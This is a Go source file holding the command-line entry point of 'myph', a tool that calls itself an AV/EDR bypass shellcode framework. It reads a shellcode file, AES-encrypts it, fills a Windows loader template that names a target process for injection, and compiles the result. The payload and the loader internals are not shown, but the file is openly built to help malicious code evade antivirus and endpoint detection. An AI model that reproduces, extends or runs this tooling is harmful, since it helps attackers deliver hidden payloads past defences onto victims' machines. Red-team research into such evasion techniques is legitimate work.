package cli

import (
	"fmt"
	"github.com/cmepw/myph/loader"
	"github.com/spf13/cobra"
	"os"
)

func GetParser(opts *Options) *cobra.Command {
	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "myph",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AV bypass shellcode creation framework",
		Long:               `CLI to prepare your shellcode and do AV/EDR bypass`,
		Run: func(cmd *cobra.Command, args []string) {

			if opts.ShellcodePath == "" {
				fmt.Println("[!] Please specify your shellcode's path with --shellcode")
				os.Exit(1)
			}

			plaintext_payload, err := loader.ReadFile(opts.ShellcodePath)
			if err != nil {
				fmt.Printf("[!] Read shellcode error: %s\n", err.Error())
				os.Exit(1)
			}

			fmt.Println("[+] Successfully read shellcode")
			payload, err := loader.Encrypt(opts.AesKey, plaintext_payload)
			if err != nil {
				fmt.Println(err.Error())
				os.Exit(1)
			}

			os.Setenv("GOOS", opts.OS)
			os.Setenv("GOARCH", opts.arch)
			s := loader.Shellcode{
				Payload:  payload,
				Filename: opts.Outfile,
				AesKey:   []byte(opts.AesKey),
				Target:   opts.Target,
			}

			fmt.Println("[+] Encrypted shellcode with AES key")
			toCompile := loader.LoadWindowsTemplate(s)
			err = loader.WriteToTempfile(toCompile)
			if err != nil {
				fmt.Printf("Write error: %s\n", err.Error())
				os.Exit(1)
			}

			fmt.Println("[+] loaded Windows template")

			/* run compilation */
			loader.Compile(s)
		},
	}

	defaults := GetDefaultCLIOptions()

	cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "f", defaults.Outfile, "output filepath")
	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
	cmd.PersistentFlags().BytesHexVarP(&opts.AesKey, "aes-key", "a", defaults.AesKey, "AES key for shellcode encryption")
	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")
	cmd.PersistentFlags().StringVarP(&opts.Target, "target-process", "t", defaults.Target, "target for process injection")

	return cmd
}
